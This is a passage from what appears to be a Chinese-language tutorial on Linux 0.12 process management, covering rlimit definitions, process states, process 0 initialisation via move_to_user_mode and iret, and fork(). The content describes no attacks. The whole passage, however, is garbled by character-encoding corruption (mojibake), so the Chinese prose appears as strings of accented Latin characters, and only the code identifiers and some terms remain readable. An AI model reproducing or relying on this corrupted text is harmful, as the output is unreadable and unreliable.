ä¸­èµ„æºç±»å‹ï¼Œåé¢å‘å±•åˆ°ç°åœ¨å·²ç»å¤šè¾¾ 15 ç§ç±»å‹äº†ï¼Œå…·ä½“å¯ä»¥ä½¿ç”¨ man æ‰‹å†ŒæŸ¥çœ‹ setrlimit ã€‚è¿™é‡Œç®€å•åˆ—å‡º Linux 0.12 ç‰ˆæœ¬ä¸­å®šä¹‰çš„å‡ ç§ç±»å‹ï¼Œå…¶å®šä¹‰ä½ç½®ä½äºå†…æ ¸æºä»£ç çš„ include/sys/resource.h å¤´æ–‡ä»¶ä¸­ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 12345678910111213141516#define RLIMIT_CPU 0 /* CPU time in ms */#define RLIMIT_FSIZE 1 /* Maximum filesize */#define RLIMIT_DATA 2 /* max data size */#define RLIMIT_STACK 3 /* max stack size */#define RLIMIT_CORE 4 /* max core file size */#define RLIMIT_RSS 5 /* max resident set size */#ifdef notdef#define RLIMIT_MEMLOCK 6 /* max locked-in-memory address space*/#define RLIMIT_NPROC 7 /* max number of processes */#define RLIMIT_OFILE 8 /* max number of open files */#endif#define RLIM_NLIMITS 6#define RLIM_INFINITY 0x7fffffff å®é™…ä¸Šï¼Œåœ¨ Linux æ“ä½œç³»ç»Ÿä¸‹ï¼Œæˆ‘ä»¬è¿˜èƒ½å¤Ÿé€šè¿‡ cat å‘½ä»¤æ¥æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­è®¾ç½®çš„å„ä¸ªèµ„æºé™åˆ¶æ•°å€¼ã€‚æ‰“å¼€ç»ˆç«¯çª—å£ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š 1cat /proc/self/limits æ˜¾ç¤ºç»“æœå¦‚ä¸‹ï¼š å…¶ä»–å­—æ®µ è¿™ä¸ªç»“æ„ä½“ä¸­å…¶ä»–å­—æ®µä¹Ÿéƒ½æ˜¯ç”¨æ¥æè¿°è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡å†²ä¸­çš„ä¸€äº›çŠ¶æ€ä¼šç”¨åˆ°çš„å€¼ï¼Œå…·ä½“çš„å†…å®¹ç­‰åˆ°æˆ‘ä»¬ç”¨åˆ°çš„æ—¶å€™å†æ¥æè¿°ï¼Œè¿™é‡Œå°±ä¸å†ä¸€ä¸€å™è¿°äº†ã€‚ 0x07 è¿›ç¨‹è¿è¡ŒçŠ¶æ€ ä¸€ä¸ªè¿›ç¨‹åœ¨ç”Ÿå­˜æœŸå†…ï¼Œå¯ä»¥å¤„äºä¸åŒçš„çŠ¶æ€å¹¶ä¸”ç›¸äº’è½¬æ¢ï¼Œè¿™æ ·çš„çŠ¶æ€ç§°ä¸ºè¿›ç¨‹çŠ¶æ€ã€‚è¿›ç¨‹çš„å½“å‰çŠ¶æ€ä¿å­˜åœ¨åˆšåˆšæˆ‘ä»¬æè¿°è¿‡çš„å­—æ®µ state ä¸­ã€‚å½“è¿›ç¨‹æ­£åœ¨ç­‰å¾…ç³»ç»Ÿä¸­çš„èµ„æºè€Œå¤„äºç­‰å¾…çŠ¶æ€æ—¶ï¼Œç§°ä¸ºç¡çœ ç­‰å¾…çŠ¶æ€ã€‚åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œç¡çœ ç­‰å¾…çŠ¶æ€åˆ†ä¸ºå¯ä¸­æ–­å’Œä¸å¯ä¸­æ–­çš„ç­‰å¾…çŠ¶æ€ã€‚è¿›ç¨‹å…·ä½“çŠ¶æ€è½¬æ¢å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å…¶ä¸­ï¼Œéœ€è¦é‡ç‚¹æè¿°å‡ ä¸ªä¸åŒçš„è¿›ç¨‹è¿è¡ŒçŠ¶æ€ï¼š è¿è¡ŒçŠ¶æ€ TASK_RUNNING å½“è¿›ç¨‹æ­£åœ¨è¢« CPU æ‰§è¡Œï¼Œæˆ–å·²ç»å‡†å¤‡å°±ç»ªéšæ—¶å¯ä»¥ç”±è°ƒåº¦ç¨‹åºæ‰§è¡Œï¼Œåˆ™è¯¥è¿›ç¨‹çš„å½“å‰çŠ¶æ€å°±æ˜¯å‡ºäºè¿è¡ŒçŠ¶æ€ã€‚å¦‚æœæ­¤æ—¶è¿›ç¨‹æ²¡æœ‰è¢« CPU æ‰§è¡Œï¼Œåˆ™è¿›ç¨‹å½“å‰çŠ¶æ€ä¸ºå°±ç»ªè¿è¡ŒçŠ¶æ€ã€‚å¦å¤–ï¼Œè¿›ç¨‹å¯ä»¥åœ¨ç”¨æˆ·æ€è¿è¡Œä¹Ÿå¯ä»¥åœ¨å†…æ ¸æ€è¿è¡Œã€‚å½“è¿›ç¨‹æ­£åœ¨æ‰§è¡Œç”¨æˆ·è‡ªå·±çš„ä»£ç æ—¶ï¼Œå¯ä»¥çœ‹åšå¤„äºç”¨æˆ·æ€è¿è¡Œï¼›è€Œå½“è¿›ç¨‹åœ¨å†…æ ¸ä»£ç ä¸­è¿è¡Œæ—¶åˆ™çœ‹åšå‡ºäºå†…æ ¸æ€è¿è¡Œã€‚åƒä¸Šå›¾æè¿°çš„é‚£æ ·ï¼Œå½“è¿›ç¨‹å› ä¸ºç­‰å¾…ç³»ç»Ÿèµ„æºè€Œè¿›å…¥ç¡çœ çŠ¶æ€åï¼Œç³»ç»Ÿèµ„æºå‡†å¤‡å°±ç»ªåå°±ä¼šå”¤é†’è¿›ç¨‹ä»è€Œä½¿è¿›ç¨‹çŠ¶æ€è½¬æ¢æˆå°±ç»ªæ€ã€‚ å¯ä¸­æ–­ç¡çœ çŠ¶æ€ TASK_INTERRUPTIBLE å½“è¿›ç¨‹å¤„äºå¯ä¸­æ–­ç­‰å¾…ï¼ˆç¡çœ ï¼‰çŠ¶æ€æ—¶ï¼Œç³»ç»Ÿä¸ä¼šè°ƒåº¦è¯¥è¿›ç¨‹æ‰§è¡Œã€‚å½“ç³»ç»Ÿäº§ç”Ÿä¸€ä¸ªä¸­æ–­æˆ–è€…é‡Šæ”¾äº†è¿›ç¨‹æ­£åœ¨ç­‰å¾…çš„èµ„æºï¼Œæˆ–è€…è¿›ç¨‹æ”¶åˆ°ä¸€ä¸ªä¿¡å·ï¼Œéƒ½å¯ä»¥å”¤é†’è¿›ç¨‹è½¬æ¢åˆ°å°±ç»ªçŠ¶æ€ã€‚ ä¸å¯ä¸­æ–­ç¡çœ çŠ¶æ€ TASK_UNINTERRUPTIBLE è¿™ä¸ªçŠ¶æ€ä¸å¯ä¸­æ–­ç¡çœ çŠ¶æ€æœ€å¤§çš„ä¸åŒå°±æ˜¯ä¸ä¼šå› ä¸ºæ”¶åˆ°ä¿¡å·è€Œè¢«å”¤é†’ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå…¶ä»–çŠ¶æ€å‡ä¸å¯ä¸­æ–­ç¡çœ çŠ¶æ€ç±»ä¼¼ã€‚å¤„äºè¯¥çŠ¶æ€çš„è¿›ç¨‹åªèƒ½è¢«ä½¿ç”¨ wake_up() å‡½æ•°æ˜ç¡®å”¤é†’æ‰èƒ½è½¬æ¢æˆå¯è¿è¡Œçš„å°±ç»ªçŠ¶æ€ã€‚è¯¥çŠ¶æ€é€šå¸¸åœ¨è¿›ç¨‹éœ€è¦ä¸å—å¹²æ‰°åœ°ç­‰å¾…æˆ–è€…æ‰€ç­‰å¾…äº‹ä»¶ä¼šå¿«å°±ä¼šå‘ç”Ÿçš„æ—¶å€™ä½¿ç”¨ã€‚ æš‚åœçŠ¶æ€ TASK_STOPPED å½“è¿›ç¨‹æ”¶åˆ°ä¿¡å· SIGSTOP ã€ SIGTSTP ã€ SIGTTIN ã€ SIGTTOU æ—¶å°±ä¼šè¿›å…¥æš‚åœçŠ¶æ€ã€‚è¿™æ—¶å€™å¯ä»¥é€šè¿‡å°†ä¿¡å· SIGONT å‘é€ç»™è¿›ç¨‹ä½¿å¾—å…¶å°†çŠ¶æ€è½¬æ¢æˆå¯è¿è¡ŒçŠ¶æ€ã€‚è¿›ç¨‹åœ¨è°ƒè¯•æœŸé—´æ¥æ”¶åˆ°ä»»ä½•ä¿¡å·éƒ½èƒ½è¿›å…¥è¯¥çŠ¶æ€ã€‚ åƒµæ­»çŠ¶æ€ TASK_ZOMBIE å½“è¿›ç¨‹å·²ç»åœæ­¢è¿è¡Œï¼Œä½†æ˜¯è¿™ä¸ªè¿›ç¨‹çš„çˆ¶è¿›ç¨‹è¿˜æ²¡æœ‰è°ƒç”¨ç³»ç»Ÿå‡½æ•°å»è¯¢é—®å…¶çŠ¶æ€æ—¶ï¼Œè¯¥è¿›ç¨‹ä¼šå¤„äºåƒµæ­»çŠ¶æ€ã€‚ä¸ºäº†è®©çˆ¶è¿›ç¨‹èƒ½å¤Ÿç»™è·å–å…¶è¿è¡Œçš„ä¿¡æ¯ï¼Œæ­¤æ—¶å­è¿›ç¨‹çš„ä»»åŠ¡æ•°æ®ç»“æ„ä¿¡æ¯éœ€è¦æŒç»­ä¿ç•™ç€ï¼Œä»¥ä¾›çˆ¶è¿›ç¨‹éšæ—¶è°ƒç”¨ï¼Œå½“çˆ¶è¿›ç¨‹è°ƒç”¨å‡½æ•°æŸ¥çœ‹äº†è¯¥è¿›ç¨‹çš„è¿è¡Œä¿¡æ¯åï¼Œè¯¥è¿›ç¨‹çš„ä»»åŠ¡æ•°æ®ç»“æ„å°±ä¼šè¢«é‡Šæ”¾ã€‚ å½“ä¸€ä¸ªè¿›ç¨‹çš„è¿è¡Œæ—¶é—´ç‰‡ç”¨å®Œï¼Œç³»ç»Ÿå°±ä¼šä½¿ç”¨è°ƒåº¦ç¨‹åºå¼ºåˆ¶åˆ‡æ¢åˆ°å…¶ä»–è¿›ç¨‹å»æ‰§è¡Œã€‚å¦å¤–ï¼Œå¦‚æœè¿›ç¨‹åœ¨å†…æ ¸æ€è¿è¡Œæ—¶éœ€è¦ç­‰å¾…ç³»ç»Ÿçš„æŸä¸ªèµ„æºï¼Œæ­¤æ—¶è¯¥è¿›ç¨‹ä¼šè°ƒç”¨ sleep_on() æˆ–è€… interruptible_sleep_on() ä¸»åŠ¨æ”¾å¼ƒ CPU çš„ä½¿ç”¨æƒï¼Œè€Œä½¿å¾—è°ƒåº¦ç¨‹åºå»è°ƒåº¦å…¶ä»–è¿›ç¨‹è·å– CPU èµ„æºè¿›è¡Œæ‰§è¡Œï¼Œå½“å‰è¿›ç¨‹åœ¨è°ƒç”¨å‡½æ•°åä¼šè½¬å…¥ç¡çœ çŠ¶æ€ç­‰å¾…åˆé€‚çš„æ—¶å€™å†æ¢å¤æ‰§è¡Œã€‚ 0x08 è¿›ç¨‹åˆå§‹åŒ– åœ¨ Linux å†…æ ¸ä»£ç ä¸­ï¼Œåœ¨ boot/ ç›®å½•ä¸­ï¼Œå¼•å¯¼ç¨‹åºå°†å†…æ ¸ä»ç£ç›˜ä¸ŠåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶ä½¿å¾—ç³»ç»Ÿè¿›å…¥ä¿æŠ¤æ¨¡å¼ä¸‹è¿è¡Œä»¥åï¼Œå°±å¼€å§‹æ‰§è¡Œç³»ç»Ÿåˆå§‹åŒ–ç¨‹åº init/main.c ï¼Œè¯¥ç¨‹åºé¦–å…ˆç¡®å®šå¦‚ä½•åˆ†é…ä½¿ç”¨ç³»ç»Ÿç‰©ç†å†…å­˜ï¼Œå¦‚ä½•è°ƒç”¨å†…æ ¸å„éƒ¨åˆ†çš„åˆå§‹åŒ–å‡½æ•°åˆ†åˆ«å¯¹å†…å­˜ç®¡ç†ã€ä¸­æ–­å¤„ç†ã€å—è®¾å¤‡å’Œå­—ç¬¦è®¾å¤‡ã€è¿›ç¨‹ç®¡ç†ä»¥åŠç¡¬ç›˜å’Œè½¯ç›˜ç¡¬ä»¶è¿›è¡Œåˆå§‹åŒ–å¤„ç†ã€‚åœ¨å®Œæˆè¿™äº›åˆå§‹åŒ–æ“ä½œåï¼Œç³»ç»Ÿå„éƒ¨åˆ†å°†å¤„äºå¯è¿è¡ŒçŠ¶æ€ï¼Œæ­¤åç¨‹åºæŠŠè‡ªå·±è®¾å®šä¸º 0 å·è¿›ç¨‹å¹¶è¿è¡Œï¼Œä¹‹åå†ä½¿ç”¨ fork() è°ƒç”¨é¦–æ¬¡åˆ›å»º 1 å·è¿›ç¨‹ã€‚åœ¨ 1 å·è¿›ç¨‹ä¸­ï¼Œç¨‹åºå°†ç»§ç»­è¿›è¡Œåº”ç”¨ç¯å¢ƒçš„åˆå§‹åŒ–å¹¶æ‰§è¡Œ shell ç™»å½•ç¨‹åºã€‚è€Œ 0 å·è¿›ç¨‹åˆ™ä¼šåœ¨ç³»ç»Ÿç©ºé—²æ—¶è¢«è°ƒåº¦æ‰§è¡Œï¼Œæ­¤æ—¶ 0 å·è¿›ç¨‹åªæ‰§è¡Œ pause() ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ä¸­åˆå›å»æ‰§è¡Œè°ƒåº¦å‡½æ•°ã€‚ å…¶ä¸­ï¼Œå†…æ ¸ç§»åŠ¨ç¨‹åºåˆ° 0 å·è¿›ç¨‹ä¸­å»æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹å® move_to_user_mode (include/asm/system.h) å®Œæˆï¼Œå®ƒå°† main.c ç¨‹åºæ‰§è¡Œæµä»å†…æ ¸æ€ç§»åŠ¨åˆ°äº†ç”¨æˆ·æ€çš„è¿›ç¨‹ 0 ä¸­ç»§ç»­è¿è¡Œã€‚åœ¨ç§»åŠ¨ä¹‹å‰ï¼Œç³»ç»Ÿåœ¨å¯¹è°ƒåº¦ç¨‹åºçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼ˆsched_init()ï¼‰ä¸­ï¼Œé¦–å…ˆå¯¹è¿›ç¨‹ 0 çš„è¿è¡Œç¯å¢ƒè¿›è¡Œè®¾ç½®ï¼Œå…¶ä¸­åŒ…æ‹¬äººå·¥é¢„å…ˆè®¾ç½®å¥½çš„è¿›ç¨‹ 0 çš„æ•°æ®ç»“æ„å„å­—æ®µçš„å€¼ï¼ˆinclude/linux/sched.hï¼‰ã€åœ¨å…¨å±€æè¿°ç¬¦è¡¨ä¸­æ·»å…¥è¿›ç¨‹ 0 çš„ä»»åŠ¡çŠ¶æ€æ®µï¼ˆTSSï¼‰æè¿°ç¬¦å’Œå±€éƒ¨æè¿°ç¬¦è¡¨ï¼ˆLDTï¼‰çš„æ®µæè¿°ç¬¦ï¼Œå¹¶æŠŠå®ƒä»¬åˆ†åˆ«åŠ è½½åˆ°ä»»åŠ¡å¯„å­˜å™¨ tr å’Œå±€éƒ¨æè¿°ç¬¦è¡¨å¯„å­˜å™¨ ldr ä¸­ã€‚ å†…æ ¸åˆå§‹åŒ–æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¿‡ç¨‹ï¼Œå†…æ ¸åˆå§‹åŒ–ä»£ç å…¶å®å°±æ˜¯è¿›ç¨‹ 0 çš„ä»£ç ã€‚ä»è¿›ç¨‹ 0 æ•°æ®ç»“æ„ä¸­è®¾ç½®çš„åˆå§‹æ•°æ®å¯ä»¥çŸ¥é“ï¼Œè¿›ç¨‹ 0 çš„ä»£ç æ®µå’Œæ•°æ®æ®µçš„åŸºåœ°å€éƒ½æ˜¯ 0 ï¼Œæ®µæœ€å¤§å­—èŠ‚é•¿åº¦é™åˆ¶åœ¨ 640KB ã€‚ä¸ä¹‹ç›¸æ¯”è¾ƒï¼Œå†…æ ¸ä»£ç çš„ä»£ç æ®µå’Œæ•°æ®æ®µçš„åŸºåœ°å€ä¹Ÿéƒ½æ˜¯ 0 ï¼Œè€Œæ®µé•¿åº¦é™åˆ¶ä¸º 16MB ï¼Œå› æ­¤è¿›ç¨‹ 0 çš„ä»£ç æ®µå’Œæ•°æ®æ®µæ˜¯åŒ…å«åœ¨å†…æ ¸ä»£ç æ®µå’Œæ•°æ®æ®µä¸­ã€‚å†…æ ¸åˆå§‹ç¨‹åº main.c å°±æ˜¯è¿›ç¨‹ 0 çš„ä»£ç ï¼Œåªæ˜¯åœ¨çœŸæ­£æˆä¸ºè¿›ç¨‹ 0 ä¹‹å‰ï¼Œç³»ç»Ÿæ­£åœ¨ä»¥å†…æ ¸æ€ç‰¹æƒçº§ 0 è¿è¡Œç€ main.c ç¨‹åºã€‚ å® move_to_user_mode çš„åŠŸèƒ½å°±æ˜¯æŠŠè¿è¡Œç‰¹æƒçº§ä»å†…æ ¸æ€çš„ 0 çº§å˜æ¢æˆç”¨æˆ·æ€çš„ 3 çº§ï¼Œä½†æ˜¯ä»ç„¶ç»§ç»­æ‰§è¡ŒåŸæ¥çš„ä»£ç æŒ‡ä»¤æµã€‚åœ¨å˜æ¢å½“å‰ç¨‹åºåˆ° 0 å·è¿›ç¨‹çš„è¿‡ç¨‹ä¸­ï¼Œå® move_to_user_mode ä½¿ç”¨äº†ä¸­æ–­è¿”å›æŒ‡ä»¤é€ æˆç‰¹æƒçº§æ”¹å˜çš„æ–¹æ³•ã€‚ä½¿ç”¨è¿™ç§æ–¹æ³•è¿›è¡Œæ§åˆ¶æƒè½¬ç§»æ˜¯ç”± CPU ä¿æŠ¤æœºåˆ¶é€ æˆçš„ã€‚ CPU å…è®¸ä½çº§åˆ«ä»£ç é€šè¿‡è°ƒç”¨é—¨æˆ–ä¸­æ–­ã€é™·é˜±é—¨æ¥è°ƒç”¨æˆ–è½¬ç§»åˆ°é«˜çº§åˆ«ä»£ç ä¸­è¿è¡Œï¼Œä½†åä¹‹åˆ™ä¸è¡Œã€‚å› æ­¤å†…æ ¸é‡‡ç”¨è¿™ç§æ¨¡æ‹Ÿ IRET è¿”å›ä½çº§åˆ«ä»£ç çš„æ–¹å¼ã€‚è¯¥æ–¹æ³•çš„ä¸»è¦æ€æƒ³æ˜¯åœ¨å †æ ˆä¸­æ„ç­‘ä¸­æ–­è¿”å›æŒ‡ä»¤éœ€è¦çš„å†…å®¹ï¼ŒæŠŠè¿”å›åœ°å€çš„æ®µé€‰æ‹©ç¬¦è®¾ç½®æˆä»»åŠ¡ 0 ä»£ç æ®µé€‰æ‹©ç¬¦ï¼Œä¹‹åæ‰§è¡Œä¸­æ–­è¿”å›æŒ‡ä»¤ iret å°†å¯¼è‡´ CPU ä»ç‰¹æƒçº§ 0 è·³è½¬åˆ°å¤–å±‚çš„ç‰¹æƒçº§ 3 ä¸Šè¿è¡Œã€‚å…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å® move_to_user_mode é¦–å…ˆå¾€å†…æ ¸å †æ ˆä¸­å‹å…¥è¿›ç¨‹ 0 å †æ ˆç«¯ï¼ˆå³æ•°æ®æ®µï¼‰é€‰æ‹©ç¬¦å’Œå†…æ ¸å †æ ˆæŒ‡é’ˆï¼Œç„¶åå‹å…¥æ ‡å¿—å¯„å­˜å™¨å†…å®¹ï¼Œæœ€åå‹å…¥è¿›ç¨‹ 0 ä»£ç æ®µé€‰æ‹©ç¬¦å’Œæ‰§è¡Œä¸­æ–­è¿”å›åéœ€è¦æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åç§»åœ°å€ã€‚è¯¥åç§»ä½ç½®æ˜¯ iret åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ å½“æ‰§è¡Œ iret æŒ‡ä»¤æ—¶ï¼Œ CPU æŠŠè¿”å›åœ°å€é€å…¥ CS:EIP ä¸­ï¼ŒåŒæ—¶å¼¹å‡ºå †æ ˆä¸­æ ‡å¿—å¯„å­˜å™¨å†…å®¹ã€‚ç”±äº CPU åˆ¤æ–­å‡ºç›®çš„ä»£ç æ®µçš„ç‰¹æƒçº§ä¸º 3 ï¼Œä¸å½“å‰å†…æ ¸æ€çš„ 0 çº§ä¸åŒï¼Œäºæ˜¯ CPU ä¼šæŠŠå †æ ˆä¸­çš„å †æ ˆæ®µé€‰æ‹©ç¬¦å’Œå †æ ˆæŒ‡é’ˆå¼¹å‡ºåˆ° SS:ESP ä¸­ã€‚ç”±äºç‰¹æƒçº§å‘ç”Ÿäº†å˜åŒ–ï¼Œæ®µå¯„å­˜å™¨ DS ã€ ES ã€ FS ä»¥åŠ GS çš„å€¼å˜å¾—æ— æ•ˆï¼Œæ­¤æ—¶ CPU ä¼šæŠŠè¿™äº›æ®µå¯„å­˜å™¨æ¸…é›¶ï¼Œå› æ­¤åœ¨æ‰§è¡Œäº† iret æŒ‡ä»¤åéœ€è¦é‡æ–°åŠ è½½è¿™äº›å¯„å­˜å™¨ã€‚è¿™ä¹‹åï¼Œç³»ç»Ÿå°±å¼€å§‹ä»¥ç‰¹æƒçº§ 3 è¿è¡Œåœ¨è¿›ç¨‹ 0 çš„ä»£ç ä¸Šï¼Œæ‰€ä½¿ç”¨çš„ç”¨æˆ·æ€å †æ ˆè¿˜æ˜¯åŸæ¥ç§»åŠ¨ä¹‹å‰ä½¿ç”¨çš„å †æ ˆï¼Œè€Œå†…æ ¸æ€çš„å †æ ˆåˆ™è¢«æŒ‡å®šä¸ºå…¶ä»»åŠ¡æ•°æ®ç»“æ„æ‰€åœ¨çš„é¡µé¢çš„é¡¶ç«¯å¼€å§‹ï¼ˆ PAGE_SIZE + (long)&amp;init_task ï¼‰ã€‚ä¹‹ååœ¨åˆ›å»ºæ–°è¿›ç¨‹æ—¶ï¼Œéœ€è¦å¤åˆ¶è¿›ç¨‹ 0 çš„ä»»åŠ¡æ•°æ®ç»“æ„ï¼ŒåŒ…æ‹¬ç”¨æˆ·å †æ ˆæŒ‡é’ˆï¼Œå› æ­¤è¦æ±‚è¿›ç¨‹ 0 çš„ç”¨æˆ·æ€å †æ ˆåœ¨åˆ›å»ºè¿›ç¨‹ 1 ä¹‹å‰ä¿æŒâ€œå¹²å‡€â€çŠ¶æ€ã€‚ å¯¹äºè¿›ç¨‹çš„åˆå§‹åŒ–ï¼Œæˆ‘ä»¬è¿›è¡Œç†è§£å’ŒæŒæ¡å³å¯ï¼Œè¿™éƒ¨åˆ†çš„å…·ä½“æ“ä½œéƒ½æ˜¯ç”± Linux å†…æ ¸è‡ªåŠ¨å®Œæˆçš„ï¼Œå½“æˆ‘ä»¬çœŸæ­£è¿›å…¥åˆ° Linux æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·æ€ä¸‹åï¼Œè¿›ç¨‹çš„åˆå§‹åŒ–å·²ç»å®Œæˆï¼ŒLinux æ“ä½œç³»ç»Ÿçš„ 0 å·è¿›ç¨‹å·²ç»è¿è¡Œèµ·æ¥äº†ã€‚æˆ‘ä»¬è‡ªå·±çš„ç¨‹åºæ­¤æ—¶åœ¨ Linux æ“ä½œç³»ç»Ÿä¸‹è¿è¡Œæ—¶ä¼šè‡ªç„¶è€Œç„¶ç”± 0 å·è¿›ç¨‹è¿›è¡Œåˆ›å»ºå¹¶æ‰§è¡Œã€‚ 0x09 åˆ›å»ºæ–°è¿›ç¨‹ Linux å†…æ ¸ä¸­åˆ›å»ºæ–°è¿›ç¨‹ä½¿ç”¨ fork() ç³»ç»Ÿè°ƒç”¨ã€‚æ‰€æœ‰å†…æ ¸ä¸­ç®¡ç†çš„è¿›ç¨‹éƒ½æ˜¯é€šè¿‡å¤åˆ¶è¿›ç¨‹ 0 è€Œå¾—åˆ°çš„ï¼Œæ‰€ä»¥åœ¨ Linux ç³»ç»Ÿä¸‹è¿è¡Œçš„è¿›ç¨‹æœ€åˆéƒ½æ˜¯ç”±è¿›ç¨‹ 0 äº§ç”Ÿçš„å­è¿›ç¨‹ã€‚ åœ¨åˆ›å»ºæ–°è¿›ç¨‹çš„è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿé¦–å…ˆåœ¨ä»»åŠ¡æ•°ç»„ä¸­æ‰¾å‡ºä¸€ä¸ªè¿˜æ²¡æœ‰è¢«ä»»ä½•è¿›ç¨‹ä½¿ç”¨çš„ç©ºé¡¹ï¼Œå¦‚æœ Linux ç³»ç»Ÿä¸‹ç®¡ç†çš„è¿›ç¨‹å·²ç»è¾¾åˆ°æ‰€èƒ½ç®¡ç†é™åˆ¶å€¼åï¼ˆåœ¨ Linux 0.12 ç‰ˆæœ¬å†…æ ¸ä¸­è®¾å®šçš„è¿›ç¨‹æ•°é‡æœ€å¤§å€¼ä¸º 64 ï¼‰ï¼Œåˆ™ fork() ç³»ç»Ÿè°ƒç”¨ä¼šå› ä¸ºä»»åŠ¡æ•°ç»„è¡¨ä¸­æ²¡æœ‰å¯ç”¨ç©ºé¡¹è€Œå‡ºé”™è¿”å›ï¼Œç„¶åç³»ç»Ÿä¸ºæ–°å»ºè¿›ç¨‹åœ¨ä¸»å†…å­˜åŒºä¸­ç”³è¯·ä¸€é¡µå†…å­˜æ¥å­˜æ”¾å…¶äººä»»åŠ¡æ•°æ®ç»“æ„ä¿¡æ¯ï¼Œå¹¶ä¸”å¤åˆ¶å½“å‰è¿›ç¨‹ä»»åŠ¡æ•°æ®ç»“æ„ä¸­æ‰€æœ‰å†…å®¹ä½œä¸ºæ–°è¿›ç¨‹ä»»åŠ¡æ•°æ®ç»“æ„çš„æ¨¡æ¿ï¼Œä¸ºäº†é˜²æ­¢è¿™ä¸ªè¿˜æœªå¤„ç†å®Œæˆçš„æ–°å»ºè¿›ç¨‹è¢«è°ƒåº¦å‡½æ•°æ‰§è¡Œï¼Œæ­¤æ—¶åº”è¯¥ç«‹åˆ»å°†æ–°è¿›ç¨‹çŠ¶æ€ç½®ä½ä¸å¯ä¸­æ–­çš„ç­‰å¾…çŠ¶æ€ï¼ˆTASK_UNINTERRUPTIBLE) å¤åˆ¶ä»»åŠ¡æ•°æ®ç»“æ„å®Œæˆåï¼Œæ¥ç€å°±æ˜¯å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼ŒæŠŠå½“å‰è¿›ç¨‹è®¾ç½®ä¸ºæ–°çš„è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼Œæ¸…é™¤ä¿¡å·ä½å›¾å¹¶å¤ä½æ–°è¿›ç¨‹å„ç»Ÿè®¡å€¼ï¼Œå¹¶è®¾ç½®åˆå§‹è¿è¡Œæ—¶é—´ç‰‡å€¼ä¸º 15 ä¸ªæ—¶é—´æ»´ç­”æ•°ï¼ˆ 150ms ï¼‰ï¼Œæ¥ç€å°†æ ¹æ®å½“å‰è¿›ç¨‹è®¾ç½®ä»»åŠ¡çŠ¶æ€æ®µï¼ˆTSSï¼‰ä¸­å„å¯„å­˜å™¨çš„å€¼ã€‚ç”±äºåˆ›å»ºè¿›ç¨‹æ—¶æ–°è¿›ç¨‹è¿”å›å€¼åº”ä¸º 0 ï¼Œä½¿ç”¨éœ€è¦è®¾ç½®ä¸º tss.eax = 0 ï¼Œæ–°å»ºè¿›ç¨‹å†…æ ¸æ€å †æ ˆæŒ‡é’ˆ tss.esp0 è¢«è®¾ç½®æˆæ–°è¿›ç¨‹ä»»åŠ¡æ•°æ®ç»“æ„æ‰€åœ¨å†…å­˜é¡µé¢çš„é¡¶ç«¯ï¼Œè€Œå †æ ˆæ®µ tss.ss0 è¢«è®¾ç½®æˆå†…æ ¸æ•°æ®æ®µé€‰æ‹©ç¬¦ï¼Œ tss.ldt è¢«è®¾ç½®æˆå±€éƒ¨è¡¨æè¿°ç¬¦åœ¨ GDT ä¸­çš„ç´¢å¼•å€¼ï¼Œè‹¥å½“å‰è¿›ç¨‹ä½¿ç”¨äº†åå¤„ç†å™¨ï¼Œåˆ™è¿˜éœ€è¦æŠŠåå¤„ç†å™¨çš„å®Œæ•´çŠ¶æ€ä¿å­˜åˆ°æ–°è¿›ç¨‹çš„ tss.i387 ç»“æ„ä¸­ã€‚ ä¹‹åç³»ç»Ÿè®¾ç½®æ–°è¿›ç¨‹çš„ä»£ç æ®µå’Œæ•°æ®æ®µåŸºåœ°å€ã€é™åˆ¶é•¿åº¦ï¼Œå¹¶å¤åˆ¶å½“å‰è¿›ç¨‹å†…å­˜åˆ†é¡µç®¡ç†çš„é¡µè¡¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶ç³»ç»Ÿå¹¶ä¸ä¸ºæ–°è¿›ç¨‹åˆ†é…å®é™…çš„ç‰©ç†å†…å­˜é¡µé¢ï¼Œè€Œæ˜¯è®©å®ƒå…±äº«çˆ¶è¿›ç¨‹çš„å†…å­˜é¡µé¢ã€‚åªæœ‰å½“çˆ¶è¿›ç¨‹æˆ–è€…æ–°è¿›ç¨‹ä¸­ä»»æ„ä¸€ä¸ªè¿›è¡Œäº†å†™å†…å­˜æ“ä½œæ—¶ï¼Œç³»ç»Ÿæ‰ä¼šä¸ºæ‰§è¡Œå†™æ“ä½œçš„è¿›ç¨‹åˆ†é…ç›¸å…³çš„ç‹¬ç«‹ä½¿ç”¨çš„å†…å­˜é¡µé¢ï¼Œè¿™ç§å¤„ç†æ–¹å¼ç§°ä¸ºå†™æ—¶å¤åˆ¶æŠ€æœ¯ã€‚ éšåï¼Œå¦‚æœçˆ¶è¿›ç¨‹ä¸­æœ‰æ–‡ä»¶æ˜¯æ‰“å¼€çš„ï¼Œåˆ™åº”è¯¥å°†å¯¹åº”æ–‡ä»¶çš„æ‰“å¼€æ¬¡æ•°åŠ  1 ã€‚ç´§æ¥ç€åœ¨ GDT ä¸­è®¾ç½®æ–°ä»»åŠ¡çš„ TSS å’Œ LDT æè¿°ç¬¦é¡¹ï¼Œå…¶ä¸­åŸºåœ°å€ä¿¡æ¯æŒ‡å‘æ–°è¿›ç¨‹ä»»åŠ¡ç»“æ„ä¸­çš„ tss å’Œ ldt ï¼Œæœ€åå†å°†æ–°ä»»åŠ¡è®¾ç½®æˆå¯è¿è¡ŒçŠ¶æ€å¹¶è¿”å›æ–°è¿›ç¨‹å·ã€‚ 